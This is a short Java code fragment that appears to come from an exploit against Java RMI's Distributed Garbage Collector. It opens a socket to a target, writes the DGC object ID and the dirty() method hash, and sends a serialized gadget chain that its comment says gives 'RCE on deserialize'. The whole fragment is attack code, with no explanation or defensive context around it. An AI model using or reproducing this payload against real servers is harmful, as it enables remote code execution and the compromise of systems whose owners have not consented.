Socket s = SocketFactory.getDefault().createSocket(host, port);
ObjectOutputStream oos = new MarshalOutputStream(new DataOutputStream(s.getOutputStream()));
oos.writeLong(2); // DGC ObjID
oos.writeLong(-669196253586618813L); // DGC.dirty() method hash
oos.writeObject(gadgetChain); // RCE on deserialize
